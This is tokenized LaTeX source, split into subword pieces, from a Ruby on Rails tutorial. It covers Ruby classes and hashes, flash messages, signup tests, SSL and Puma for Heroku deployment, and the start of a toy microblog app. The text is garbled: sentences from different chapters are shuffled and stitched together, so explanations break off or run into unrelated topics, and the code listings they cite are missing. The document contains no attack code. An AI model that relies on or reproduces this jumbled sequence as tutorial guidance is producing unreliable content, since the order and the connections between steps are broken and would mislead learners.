▁The ▁subsequent ▁code ▁creates ▁an ▁empty ▁example ▁user ▁and ▁the n ▁fill s ▁in ▁the ▁name ▁and ▁email ▁address ▁by ▁assign ing ▁directly ▁to ▁the ▁corresponding ▁attributes ▁( assignment s ▁made ▁possible ▁by ▁the ▁\ k ode { attr \_ accessor } ▁line ▁in ▁Listing ~\ ref { code : example _ user }).
▁When ▁we ▁write
▁Ruby ▁is ▁setting ▁the ▁\ k ode {@ name } ▁variable ▁to ▁\ k ode {" Ex ample ▁User "} ▁( and ▁similar ly ▁for ▁the ▁\ k ode { email } ▁attribute ), ▁which ▁we ▁the n ▁use ▁in ▁the ▁\ k ode { formatted \_ email } ▁method .
▁Recall ing ▁from ▁Section ~\ ref { sec : css _ revisited } ▁we ▁can ▁omit ▁the ▁ curl y ▁braces ▁for ▁final ▁hash ▁arguments , ▁we ▁can ▁create ▁another ▁user ▁by ▁passing ▁a ▁hash ▁to ▁the ▁\ k ode { initialize } ▁method ▁to ▁create ▁a ▁user ▁with ▁pre - defined ▁attributes :
▁=> ▁#< User : 0 x 22 5 16 7 c ▁@ email =" mhartl @ example . com ", ▁@ name =" Michael ▁Hartl ">
▁Using ▁a ▁different ▁class ▁for ▁each ▁key ▁allows ▁us ▁to ▁apply ▁different ▁style s ▁to ▁different ▁kind s ▁of ▁messages .
▁For ▁example , ▁in ▁Section ~\ ref { sec : render ing _ with _ a _ flash _ message } ▁we ' ll ▁use ▁\ k ode { flash [: danger ]} ▁to ▁indicate ▁a ▁failed ▁login ▁attempt
▁=> ▁" Michael ▁Hartl ▁< mhartl @ example . com > "
▁ Actually , ▁we ' ll ▁use ▁the ▁close ly ▁related ▁\ k ode { flash . now }, ▁but ▁we ' ll ▁def er ▁that ▁subtlety ▁un til ▁we ▁need ▁it .
▁We ▁will ▁see ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up } ▁that ▁initializ ing ▁objects ▁using ▁a ▁hash ▁argument , ▁a ▁technique ▁known ▁as ▁\ emph { mass ▁assignment }, ▁is ▁common ▁in ▁Rails ▁applications .
▁( In ▁fact , ▁we ' ve ▁already ▁used ▁\ k ode { alert - danger } ▁once , ▁to ▁style ▁the ▁error ▁message ▁ div ▁in ▁Listing ~\ ref { code : errors _ partial }. )
▁This ▁con c l u de s ▁our ▁ overview ▁of ▁the ▁Ruby ▁language .
▁Bootstrap ▁CSS ▁supports ▁styling ▁for ▁four ▁such ▁flash ▁classes ▁(\ k ode { success }, ▁\ k ode { info }, ▁\ k ode { warning }, ▁and ▁\ k ode { danger }), ▁and ▁we ' ll ▁find ▁ o cc as ion ▁to ▁use ▁all ▁of ▁them ▁in ▁the ▁course ▁of ▁developing ▁the ▁sample ▁application .
▁In ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }, ▁we ' ll ▁start ▁ putting ▁it ▁to ▁good ▁use ▁in ▁developing ▁the ▁sample ▁application .
▁Because ▁the ▁message ▁is ▁also ▁inserted ▁into ▁the ▁template , ▁the ▁full ▁HTML ▁result ▁for
▁We ▁won ' t ▁be ▁using ▁the ▁\ k ode { example \_ user . rb } ▁file ▁from ▁Section ~\ ref { sec : a _ user _ class }, ▁so ▁I ▁suggest ▁remov ing ▁it :
▁appears ▁as ▁follows :
▁Then ▁commit ▁the ▁other ▁changes ▁to ▁the ▁main ▁source ▁code ▁repository , ▁push ▁up ▁to ▁Bitbucket , ▁and ▁deploy ▁to ▁Heroku :
▁P utting ▁the ▁ embedded ▁Ruby ▁discuss ed ▁above ▁into ▁the ▁site ▁layout ▁lead s ▁to ▁the ▁code ▁in ▁Listing ~\ ref { code : layout _ flash }.
▁ Adding ▁the ▁contents ▁of ▁the ▁\ k ode { flash } ▁variable ▁to ▁the ▁site ▁layout .
▁Ruby ▁has ▁a ▁large ▁number ▁of ▁methods ▁for ▁m anipulating ▁strings ▁of ▁characters .
▁E verything ▁in ▁Ruby ▁is ▁an ▁object .
▁Ruby ▁supports ▁method ▁definition ▁via ▁the ▁\ k ode { de f } ▁keyword .
▁Ruby ▁supports ▁class ▁definition ▁via ▁the ▁\ k ode { class } ▁keyword .
▁Rails ▁views ▁can ▁contain ▁static ▁HTML ▁or ▁ embedded ▁Ruby ▁( ER b ).
▁B u il t - in ▁Ruby ▁data ▁structure s ▁include ▁arrays , ▁range s , ▁and ▁hashes .
▁Ruby ▁blocks ▁are ▁a ▁flexible ▁construct ▁that ▁( a mong ▁other ▁things ) ▁allow ▁natural ▁iterat ion ▁over ▁e numerable ▁data ▁structure s .
▁ Symbol s ▁are ▁ label s , ▁like ▁strings ▁without ▁any ▁ additional ▁structure .
▁We ▁can ▁see ▁the ▁result ▁of ▁all ▁this ▁work ▁by ▁sign ing ▁up ▁our ▁first ▁user ▁under ▁the ▁name ▁`` Rails ▁Tutorial '' ▁and ▁email ▁address ▁`` example @ railstutorial . org '' ▁( F igure ~\ ref { fig : first _ signup }).
▁Ruby ▁supports ▁object ▁inheritance .
▁The ▁result ing ▁page ▁( F igure ~\ ref { fig : signup _ flash }) ▁shows ▁a ▁ friendly ▁message ▁upon ▁successful ▁signup , ▁including ▁nice ▁green ▁styling ▁for ▁the ▁\ k ode { success } ▁class , ▁which ▁comes ▁included ▁with ▁the ▁Bootstrap ▁CSS ▁framework ▁from ▁Section ~\ ref { sec : custom _ css }.
▁It ▁is ▁possible ▁to ▁open ▁up ▁and ▁modify ▁built - in ▁Ruby ▁classes .
▁( If ▁instead ▁you ▁get ▁an ▁error ▁message ▁indicat ing ▁that ▁the ▁email ▁address ▁has ▁already ▁been ▁take n , ▁be ▁sure ▁to ▁run ▁the ▁\ k ode { db : migrate : reset } ▁Rake ▁task ▁as ▁indicate d ▁in ▁Section ~\ ref { sec : signup _ form } ▁and ▁restart ▁the ▁development ▁webserver .)
▁Then , ▁upon ▁reload ing ▁the ▁user ▁show ▁page , ▁the ▁flash ▁message ▁disappear s ▁as ▁ promised ▁( F igure ~\ ref { fig : signup _ flash _ reload ed }).
▁The ▁word ▁`` de if i ed '' ▁is ▁a ▁ palindrome .
▁F i ll ing ▁in ▁the ▁information ▁for ▁the ▁first ▁signup .
▁The ▁results ▁of ▁a ▁successful ▁user ▁signup , ▁with ▁flash ▁message .
▁The ▁flash - less ▁profile ▁page ▁after ▁a ▁browser ▁reload .
▁We ▁can ▁now ▁check ▁our ▁database ▁just ▁to ▁double - check ▁that ▁the ▁new ▁user ▁was ▁actually ▁created :
▁Before ▁mov ing ▁on , ▁we ' ll ▁write ▁a ▁test ▁for ▁valid ▁submission ▁to ▁verify ▁our ▁application ' s ▁behavior ▁and ▁catch ▁re gr es s ion s .
▁As ▁with ▁the ▁test ▁for ▁invalid ▁submission ▁in ▁Section ~\ ref { sec : a _ test _ for _ invalid _ submission }, ▁our ▁main ▁purpose ▁is ▁to ▁verify ▁the ▁contents ▁of ▁the ▁database .
▁In ▁this ▁case , ▁we ▁want ▁to ▁submit ▁valid ▁information ▁and ▁the n ▁confirm ▁that ▁a ▁user ▁\ emph { w as } ▁created .
▁In ▁analogy ▁with ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission }, ▁which ▁used
▁By ▁replacing ▁the ▁question ▁mark s ▁in ▁Listing ~\ ref { code : string _ shuffle } ▁with ▁the ▁appropriate ▁methods , ▁combine ▁\ k ode { split }, ▁\ k ode { shuffle }, ▁and ▁\ k ode { join } ▁to ▁write ▁a ▁function ▁that ▁ shuffle s ▁the ▁letter s ▁in ▁a ▁given ▁string .
▁here ▁we ' ll ▁use ▁the ▁corresponding ▁\ k ode { assert \_ difference } ▁method :
▁Using ▁Listing ~\ ref { code : string _ shuffle _ two } ▁as ▁a ▁guide , ▁add ▁a ▁\ k ode { shuffle } ▁method ▁to ▁the ▁\ k ode { String } ▁class .
▁Create ▁three ▁hashes ▁called ▁\ k ode { person 1 }, ▁\ k ode { person 2 }, ▁and ▁\ k ode { person 3 }, ▁with ▁first ▁and ▁last ▁names ▁under ▁the ▁keys ▁\ k ode { : first } ▁and ▁\ k ode { : last }.
▁The ▁second ▁( option al ) ▁argument ▁specifie s ▁the ▁size ▁of ▁the ▁difference ▁( in ▁this ▁case , ▁1) .
▁In c or p or at ing ▁\ k ode { assert \_ difference } ▁into ▁the ▁file ▁from ▁Listing ~\ ref { code : a _ test _ for _ invalid _ submission } ▁yields ▁the ▁test ▁show n ▁in ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission }.
▁Verify ▁that , ▁for ▁example , ▁\ k ode { params [: f ather ] [: first ]} ▁has ▁the ▁right ▁value .
▁Note ▁that ▁we ' ve ▁used ▁the ▁\ k ode { post \_ via \_ redirect } ▁variant ▁to ▁post ▁to ▁the ▁users ▁path .
▁Find ▁an ▁online ▁version ▁of ▁the ▁Ruby ▁API ▁and ▁read ▁about ▁the ▁ Hash ▁method ▁\ k ode { merge }.
▁This ▁simply ▁arrange s ▁to ▁follow ▁the ▁redirect ▁after ▁submission , ▁result ing ▁in ▁a ▁rendering ▁of ▁the ▁\ k ode { ' users / show ' } ▁template .
▁What ▁is ▁the ▁value ▁of ▁the ▁following ▁expression ?
▁( It ' s ▁ probably ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁the ▁flash ▁as ▁well , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : signup _ exercises }).)
▁S k e leton ▁for ▁a ▁string ▁ shuffle ▁function .
▁A ▁test ▁for ▁a ▁valid ▁signup .
▁S k e leton ▁for ▁a ▁\ k ode { shuffle } ▁method ▁attach ed ▁to ▁the ▁\ k ode { String } ▁class .
▁Note ▁that ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } ▁also ▁verifie s ▁that ▁the ▁user ▁show ▁template ▁render s ▁following ▁successful ▁signup .
▁As ▁a ▁result , ▁the ▁one ▁line
▁is ▁a ▁ sensitive ▁test ▁for ▁ almost ▁everything ▁related ▁to ▁a ▁user ' s ▁profile ▁page .
▁This ▁sort ▁of ▁end - to - end ▁cover age ▁of ▁important ▁application ▁features ▁illustrate s ▁one ▁reason ▁why ▁integration ▁tests ▁are ▁so ▁useful .
▁Now ▁that ▁we ▁have ▁a ▁working ▁signup ▁page , ▁it ' s ▁time ▁to ▁deploy ▁our ▁application ▁and ▁get ▁it ▁working ▁in ▁production .
▁A lthough ▁we ▁started ▁deploying ▁our ▁application ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁is ▁the ▁first ▁time ▁it ▁will ▁actually ▁\ emph { do } ▁something , ▁so ▁we ' ll ▁take ▁this ▁opportunit y ▁to ▁make ▁the ▁deployment ▁p rofessional - grade .
▁In ▁particular , ▁we ' ll ▁add ▁an ▁important ▁feature ▁to ▁the ▁production ▁application ▁to ▁make ▁signup ▁secure , ▁and ▁we ' ll ▁replace ▁the ▁default ▁web ▁server ▁with ▁one ▁suit able ▁for ▁real - world ▁use .
▁As ▁prepar ation ▁for ▁the ▁deployment , ▁you ▁should ▁merge ▁your ▁changes ▁into ▁the ▁\ k ode { master } ▁branch ▁at ▁this ▁point :
▁< n >\ end { code }< n >< n > ▁\ subsection { SSL ▁in ▁production } ▁% ▁( fold )< n > ▁\ label { sec : ssl _ in _ production }< n >< n >
▁When ▁ submitting ▁the ▁signup ▁form ▁ developed ▁in ▁this ▁chapter , ▁the ▁name , ▁email ▁address , ▁and ▁password ▁get ▁sent ▁over ▁the ▁network , ▁and ▁hence ▁are ▁vulnerable ▁to ▁intercept .
▁ Technical ly , ▁SSL ▁is ▁now ▁T L S , ▁for ▁ Trans port ▁L a y er ▁ Security , ▁but ▁every one ▁I ▁know ▁ still ▁say s ▁`` SSL ''.
▁A lthough ▁we ▁could ▁use ▁SSL ▁on ▁just ▁the ▁signup ▁page , ▁it ' s ▁actually ▁easier ▁to ▁implement ▁it ▁site - wide , ▁which ▁has ▁the ▁ additional ▁benefit s ▁of ▁ sec ur ing ▁user ▁login ▁( Chapter ~\ ref { cha : log _ in _ log _ out }) ▁and ▁making ▁our ▁application ▁imm un e ▁to ▁a ▁ critical ▁\ emph { session ▁ hijack ing } ▁ vulnerabilit y ▁discuss ed ▁in ▁Section ~\ ref { sec : remember _ me }.
▁As ▁show n ▁in ▁Listing ~\ ref { code : ssl _ in _ production }, ▁all ▁we ▁need ▁to ▁do ▁is ▁set ▁the ▁\ k ode { config } ▁variable ▁to ▁force ▁the ▁use ▁of ▁SSL ▁in ▁production .
▁Configur ing ▁the ▁application ▁to ▁use ▁SSL ▁in ▁production .
▁# ▁For ce ▁all ▁access ▁to ▁the ▁app ▁over ▁SSL , ▁use ▁ Strict - Trans port - Security ,
▁# ▁and ▁use ▁secure ▁cookies .
▁At ▁this ▁stage , ▁we ▁need ▁to ▁set ▁up ▁SSL ▁on ▁the ▁remote ▁server .
▁Setting ▁up ▁a ▁production ▁site ▁to ▁use ▁SSL ▁involve s ▁purchas ing ▁and ▁ configuring ▁an ▁\ emph { SSL ▁c er t if ic ate } ▁for ▁your ▁domain .
▁That ' s ▁a ▁lot ▁of ▁work , ▁though , ▁and ▁ l uckily ▁we ▁won ' t ▁need ▁it ▁here : ▁for ▁an ▁application ▁running ▁on ▁a ▁Heroku ▁domain ▁( such ▁as ▁the ▁sample ▁application ), ▁we ▁can ▁p ig g y back ▁on ▁Heroku ' s ▁SSL ▁c er t if ic ate .
▁As ▁a ▁result , ▁when ▁we ▁deploy ▁the ▁application ▁in ▁Section ~\ ref { sec : production _ web server }, ▁SSL ▁will ▁automatically ▁be ▁enabled .
▁( If ▁you ▁want ▁to ▁run ▁SSL ▁on ▁a ▁custom ▁domain , ▁such ▁as ▁\ k ode { www . example . com }, ▁refer ▁to ▁\ href { http :// dev center . heroku . com / articles / ssl }{ Heroku ' s ▁page ▁on ▁SSL }. )
▁< n >< n > ▁% ▁subsection ▁ ssl _ in _ production ▁( end )< n >< n > ▁\ subsection { Product ion ▁webserver } ▁% ▁( fold )< n > ▁\ label { sec : production _ web server }< n >< n >
▁Having ▁added ▁SSL , ▁we ▁now ▁need ▁to ▁configure ▁our ▁application ▁to ▁use ▁a ▁webserver ▁suit able ▁for ▁production ▁applications .
▁By ▁default , ▁Heroku ▁uses ▁a ▁pure - Ruby ▁webserver ▁called ▁WEBrick , ▁which ▁is ▁easy ▁to ▁set ▁up ▁and ▁run ▁but ▁is n ' t ▁good ▁at ▁handling ▁significant ▁traffic .
▁As ▁a ▁result , ▁WEBrick ▁\ href { https :// dev center . heroku . com / articles / ruby - default - web - server }{ is n ' t ▁suit able ▁for ▁production ▁use }, ▁so ▁we ' ll ▁\ href { https :// dev center . heroku . com / articles / deploying - rails - application s - with - the - puma - web - server }{ re place ▁WEBrick ▁with ▁Puma }, ▁an ▁HTTP ▁server ▁that ▁is ▁capab le ▁of ▁handling ▁a ▁large ▁number ▁of ▁in com ing ▁requests .
▁To ▁add ▁the ▁new ▁webserver , ▁we ▁simply ▁follow ▁the ▁\ href { https :// dev center . heroku . com / articles / deploying - rails - application s - with - the - puma - web - server }{ Heroku ▁Puma ▁documentation }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : puma _ gemfile }.
▁Because ▁we ▁don ' t ▁need ▁the ▁Puma ▁gem ▁local ly , ▁Listing ~\ ref { code : puma _ gemfile } ▁put s ▁it ▁in ▁the ▁\ k ode { : production } ▁group .
▁ Adding ▁Puma ▁to ▁the ▁\ k ode { Gemfile }.
▁Because ▁we ▁configured ▁Bundler ▁not ▁to ▁install ▁production ▁gems ▁( Section ~\ ref { sec : sample _ app _ setup }), ▁Listing ~\ ref { code : puma _ gemfile } ▁won ' t ▁add ▁any ▁gems ▁to ▁the ▁development ▁environment , ▁but ▁we ▁ still ▁need ▁to ▁run ▁Bundler ▁to ▁update ▁\ k ode { Gemfile . lock } :
▁The ▁next ▁step ▁is ▁to ▁create ▁a ▁file ▁called ▁\ k ode { config / puma . rb } ▁and ▁fill ▁it ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : production _ web server _ config }.
▁Listing ~\ ref { code : production _ web server _ config } ▁changes ▁the ▁format ting ▁slightly ▁so ▁that ▁the ▁code ▁fit s ▁in ▁the ▁standard ▁80 ▁columns .
▁The ▁configuration ▁file ▁for ▁the ▁production ▁webserver .
▁F inally , ▁we ▁need ▁to ▁make ▁a ▁so - called ▁\ k ode { Proc file } ▁to ▁tell ▁Heroku ▁to ▁run ▁a ▁Puma ▁process ▁in ▁production , ▁as ▁show n ▁in ▁Listing ~\ ref { code : proc file }.
▁Defin ing ▁a ▁\ k ode { Proc file } ▁for ▁Puma .
▁With ▁the ▁production ▁webserver ▁configuration ▁complete d , ▁we ' re ▁ready ▁to ▁commit ▁and ▁deploy
▁We ▁have n ' t ▁changed ▁the ▁data ▁model ▁in ▁this ▁chapter , ▁so ▁running ▁the ▁migration ▁at ▁Heroku ▁should n ' t ▁be ▁necessary , ▁but ▁only ▁if ▁you ▁followed ▁the ▁steps ▁in ▁Section ~\ ref { sec : modeling _ users _ co nclusion }.
▁Because ▁sever al ▁readers ▁report ed ▁ having ▁trouble , ▁I ' ve ▁added ▁\ k ode { heroku ▁run ▁rake ▁db : migrate } ▁as ▁a ▁final ▁step ▁just ▁to ▁be ▁safe .
▁The ▁signup ▁form ▁is ▁now ▁live , ▁and ▁the ▁result ▁of ▁a ▁successful ▁signup ▁is ▁show n ▁in ▁F igure ~\ ref { fig : signup _ in _ production }.
▁Note ▁the ▁presence ▁of ▁\ text tt { https :// } ▁and ▁a ▁ lock ▁icon ▁in ▁the ▁address ▁bar ▁of ▁F igure ~\ ref { fig : signup _ in _ production }, ▁which ▁indicate ▁that ▁SSL ▁is ▁working .
▁ Sign ing ▁up ▁on ▁the ▁live ▁Web .
▁When ▁deploying ▁to ▁Heroku , ▁you ▁may ▁get ▁a ▁warning ▁message ▁like ▁this ▁one :
▁ Experience ▁shows ▁that , ▁at ▁the ▁level ▁of ▁this ▁tutorial , ▁the ▁co st s ▁ associated ▁with ▁including ▁such ▁an ▁explicit ▁Ruby ▁version ▁number ▁out we ig h ▁the ▁( n eg li g i b le ) ▁benefit s , ▁so ▁you ▁should ▁ignore ▁this ▁warning ▁for ▁now .
▁For ▁example , ▁after ▁ s pending ▁sever al ▁hours ▁ unsuccessful ly ▁try ing ▁to ▁install ▁Ruby ▁2.1. 4 ▁on ▁my ▁local ▁machine , ▁I ▁ discover ed ▁that ▁Ruby ▁2.1. 5 ▁ha d ▁been ▁release d ▁the ▁day ▁before .
▁A tt e mp t s ▁to ▁install ▁2.1. 5 ▁also ▁failed .
▁Be ing ▁able ▁to ▁sign ▁up ▁users ▁is ▁a ▁major ▁m il est one ▁for ▁our ▁application .
▁A lthough ▁the ▁sample ▁app ▁has ▁yet ▁to ▁accomplish ▁anything ▁useful , ▁we ▁have ▁ la id ▁an ▁essential ▁foundation ▁for ▁all ▁future ▁development .
▁In ▁Chapter ~\ ref { cha : log _ in _ log _ out }, ▁we ▁will ▁complete ▁our ▁authentication ▁machinery ▁by ▁allow ing ▁users ▁to ▁log ▁in ▁and ▁out ▁of ▁the ▁application .
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ▁will ▁allow ▁all ▁users ▁to ▁update ▁their ▁account ▁information , ▁and ▁we ▁will ▁allow ▁site ▁administrator s ▁to ▁delete ▁users , ▁there by ▁com p let ing ▁the ▁full ▁suite ▁of ▁Users ▁resource ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }.
▁< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : sign _ up _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁Rails ▁display s ▁useful ▁debug ▁information ▁via ▁the ▁\ k ode { debug } ▁method .
▁Sass ▁ mixin s ▁allow ▁a ▁group ▁of ▁CSS ▁rules ▁to ▁be ▁bundle d ▁and ▁reuse d ▁in ▁multiple ▁place s .
▁Rails ▁comes ▁with ▁three ▁standard ▁environments : ▁\ k ode { development }, ▁\ k ode { test }, ▁and ▁\ k ode { production }.
▁We ▁can ▁interact ▁with ▁users ▁as ▁a ▁\ emph { resource } ▁through ▁a ▁standard ▁set ▁of ▁REST ▁URLs .
▁Gravatar s ▁provide ▁a ▁convenient ▁way ▁of ▁display ing ▁images ▁to ▁represent ▁users .
▁The ▁\ k ode { form \_ for } ▁helper ▁is ▁used ▁to ▁make ▁forms ▁for ▁interact ing ▁with ▁Active ▁Record ▁objects .
▁Signup ▁failure ▁render s ▁the ▁new ▁user ▁page ▁and ▁display s ▁error ▁messages ▁automatically ▁determine d ▁by ▁Active ▁Record .
▁Rails ▁provides ▁the ▁\ k ode { flash } ▁as ▁a ▁standard ▁way ▁to ▁display ▁temporary ▁messages .
▁Signup ▁ success ▁creates ▁a ▁user ▁in ▁the ▁database ▁and ▁redirect s ▁to ▁the ▁user ▁show ▁page , ▁and ▁display s ▁a ▁ welcome ▁message .
▁We ▁can ▁use ▁integration ▁tests ▁to ▁verify ▁form ▁submission ▁behavior ▁and ▁catch ▁re gr es s ion s .
▁We ▁can ▁configure ▁our ▁production ▁application ▁to ▁use ▁SSL ▁for ▁secure ▁communicat ion s ▁and ▁Puma ▁for ▁high ▁performance .
▁Verify ▁that ▁the ▁code ▁in ▁Listing ~\ ref { code : gravatar _ option } ▁allows ▁the ▁\ k ode { gravatar \_ for } ▁helper ▁defined ▁in ▁Section ~\ ref { sec : a _ gravatar _ image } ▁to ▁take ▁an ▁optional ▁\ k ode { size } ▁parameter , ▁allow ing ▁code ▁like ▁\ k ode { gravatar \_ for ▁user , ▁size : ▁50 } ▁in ▁the ▁view .
▁( We ' ll ▁put ▁this ▁improve d ▁helper ▁to ▁use ▁in ▁Section ~\ ref { sec : users _ index }. )
▁Writ e ▁a ▁test ▁for ▁the ▁error ▁messages ▁implemented ▁in ▁Listing ~\ ref { code : f _ error _ messages }.
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁template ▁appears ▁in ▁Listing ~\ ref { code : error _ messages _ test }.
▁Writ e ▁a ▁test ▁for ▁the ▁flash ▁implemented ▁in ▁Section ~\ ref { sec : the _ flash }.
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁ ul t ra - mini ma list ▁template ▁appears ▁in ▁Listing ~\ ref { code : flash _ test }, ▁which ▁you ▁should ▁complete ▁by ▁replacing ▁\ k ode { FILL \_ IN } ▁with ▁the ▁appropriate ▁code .
▁( E ve n ▁testing ▁for ▁the ▁right ▁key , ▁much ▁less ▁the ▁text , ▁is ▁likely ▁to ▁be ▁brittle , ▁so ▁I ▁prefer ▁only ▁to ▁test ▁that ▁the ▁flash ▁is n ' t ▁empty .)
▁As ▁noted ▁in ▁Section ~\ ref { sec : the _ flash }, ▁the ▁flash ▁HTML ▁in ▁Listing ~\ ref { code : layout _ flash } ▁is ▁ugly .
▁Verify ▁by ▁running ▁the ▁test ▁suite ▁that ▁the ▁clean er ▁code ▁in ▁Listing ~\ ref { code : layout _ flash _ content _ tag }, ▁which ▁uses ▁the ▁Rails ▁\ k ode { content \_ tag } ▁helper , ▁also ▁works .
▁ Adding ▁an ▁options ▁hash ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper .
▁A ▁template ▁for ▁tests ▁of ▁the ▁error ▁messages .
▁A ▁template ▁for ▁a ▁test ▁of ▁the ▁flash .
▁The ▁\ k ode { flash } ▁ERb ▁in ▁the ▁site ▁layout ▁using ▁\ k ode { content \_ tag }.
▁In ▁this ▁chapter , ▁we ' ll ▁develop ▁a ▁toy ▁ demo ▁application ▁to ▁show ▁off ▁some ▁of ▁the ▁power ▁of ▁Rails .
▁The ▁purpose ▁is ▁to ▁get ▁a ▁high - level ▁ overview ▁of ▁Ruby ▁on ▁Rails ▁programming ▁( and ▁web ▁development ▁in ▁general ) ▁by ▁ r api d ly ▁ generating ▁an ▁application ▁using ▁\ emph { scaffold ▁generator s }, ▁which ▁create ▁a ▁large ▁amount ▁of ▁functionality ▁automatically .
▁The ▁result ing ▁toy ▁app ▁will ▁allow ▁us ▁to ▁interact ▁with ▁it ▁through ▁its ▁URLs , ▁giv ing ▁us ▁in s ight ▁into ▁the ▁structure ▁of ▁a ▁Rails ▁application , ▁including ▁a ▁first ▁example ▁of ▁the ▁\ emph { REST ▁architecture } ▁favor ed ▁by ▁Rails .
▁As ▁with ▁the ▁for th com ing ▁sample ▁application , ▁the ▁toy ▁app ▁will ▁consist ▁of ▁\ emph { users } ▁and ▁their ▁ associated ▁\ emph { microposts } ▁( th us ▁ const it u ting ▁a ▁minimal ist ▁Twitter - style ▁app ).
▁The ▁functionality ▁will ▁be ▁ u tt er ly ▁under - developed , ▁and ▁many ▁of ▁the ▁steps ▁will ▁seem ▁like ▁magic , ▁but ▁worry ▁not : ▁the ▁full ▁sample ▁app ▁will ▁develop ▁a ▁similar ▁application ▁from ▁the ▁ ground ▁up ▁starting ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁and ▁I ▁will ▁provide ▁p l ent i ful ▁forward - reference s ▁to ▁later ▁material .
▁In ▁the ▁mean ▁time , ▁have ▁p at i ence ▁and ▁a ▁little ▁fai th --- the ▁whole ▁point ▁of ▁this ▁tutorial ▁is ▁to ▁take ▁you ▁\ emph { beyond } ▁this ▁ super fi cial , ▁scaffold - driven ▁approach ▁to ▁achieve ▁a ▁ deep er ▁understanding ▁of ▁Rails .
▁< n >< n >\ section { P la n n ing ▁the ▁application } ▁% ▁( fold )< n >\ label { sec : planning _ the _ application }< n >< n >
▁In ▁this ▁section , ▁we ' ll ▁out line ▁our ▁plan s ▁for ▁the ▁toy ▁application .
▁As ▁in ▁Section ~\ ref { sec : the _ hello _ application }, ▁we ' ll ▁start ▁by ▁ generating ▁the ▁application ▁ s k e leton ▁using ▁the ▁\ k ode { rails ▁new } ▁command ▁with ▁a ▁specific ▁Rails ▁version ▁number :
▁If ▁the ▁command ▁above ▁returns ▁an ▁error ▁like ▁`` Co ul d ▁not ▁find ▁' ra il t ies ' '' , ▁it ▁means ▁you ▁don ’ t ▁have ▁the ▁right ▁version ▁of ▁Rails ▁installed , ▁and ▁you ▁should ▁double - check ▁that ▁you ▁followed ▁the ▁command ▁in ▁Listing ~\ ref { code : install ing _ rails } ▁exactly ▁as ▁written .
▁( If ▁you ' re ▁using ▁the ▁cloud ▁IDE ▁as ▁recommended ▁in ▁Section ~\ ref { sec : development _ environment }, ▁note ▁that ▁this ▁second ▁app ▁can ▁be ▁created ▁in ▁the ▁same ▁ workspace ▁as ▁the ▁first .
▁It ▁is ▁not ▁necessary ▁to ▁create ▁a ▁new ▁ workspace .
▁In ▁order ▁to ▁get ▁the ▁files ▁to ▁appear , ▁you ▁may ▁need ▁to ▁click ▁the ▁gear ▁icon ▁in ▁the ▁file ▁navigat or ▁are a ▁and ▁select ▁`` Re f re s h ▁File ▁T re e '' .)
▁A ▁\ k ode { Gemfile } ▁for ▁the ▁toy ▁app .
▁Note ▁that ▁Listing ~\ ref { code : demo _ gemfile _ sqlite _ version _ redux } ▁is ▁identical ▁to ▁Listing ~\ ref { code : gemfile _ p g _ gem }.
▁F inally , ▁we ' ll ▁put ▁the ▁toy ▁app ▁under ▁version ▁control ▁with ▁Git :
▁You ▁should ▁also ▁\ href { https :// bitbucket . org / repo / create }{ create ▁a ▁new ▁repository } ▁by ▁click ing ▁on ▁the ▁`` Create '' ▁button ▁at ▁Bitbucket ▁( F igure ~\ ref { fig : create _ demo _ repository }), ▁and ▁the n ▁push ▁up ▁to ▁the ▁remote ▁repository :
▁Creat ing ▁the ▁toy ▁app ▁repository ▁at ▁Bitbucket .
▁in ▁Listing ~\ ref { code : hello _ action } ▁and
▁The ▁main ▁reason ▁for ▁this ▁is ▁that ▁the ▁default ▁Rails ▁page ▁typical ly ▁break s ▁at ▁Heroku , ▁which ▁make s ▁it ▁hard ▁to ▁tell ▁if ▁the ▁deployment ▁was ▁successful ▁or ▁not .
▁Then ▁commit ▁the ▁changes ▁and ▁push ▁up ▁to ▁Heroku :
▁( As ▁in ▁Section ~\ ref { sec : deploying }, ▁you ▁may ▁see ▁some ▁warning ▁messages , ▁which ▁you ▁should ▁ignore ▁for ▁now .
▁We ' ll ▁eliminate ▁them ▁in ▁Section ~\ ref { sec : p rofessional _ grade _ deploy ment }. )
▁A part ▁from ▁the ▁address ▁of ▁the ▁Heroku ▁app , ▁the ▁result ▁should ▁be ▁the ▁same ▁as ▁in ▁F igure ~\ ref { fig : heroku _ app }.
▁Now ▁we ' re ▁ready ▁to ▁start ▁making ▁the ▁app ▁itself .
▁The ▁typical ▁first ▁step ▁when ▁making ▁a ▁web ▁application ▁is ▁to ▁create ▁a ▁\ emph { data ▁model }, ▁which ▁is ▁a ▁representation ▁of ▁the ▁structure s ▁needed ▁by ▁our ▁application .
▁In ▁our ▁case , ▁the ▁toy ▁app ▁will ▁be ▁a ▁microblog , ▁with ▁only ▁users ▁and ▁short ▁( micro ) post s .
▁Thus , ▁we ' ll ▁begin ▁with ▁a ▁model ▁for ▁\ emph { users } ▁of ▁the ▁app ▁( Section ~\ ref { sec : modeling _ demo _ users }), ▁and ▁the n ▁we ' ll ▁add ▁a ▁model ▁for ▁\ emph { microposts } ▁( Section ~\ ref { sec : modeling _ demo _ microposts }).
▁< n >< n > ▁\ subsection { A ▁toy ▁model ▁for ▁users } ▁% ▁( fold )< n > ▁\ label { sec : modeling _ demo _ users }< n >< n >
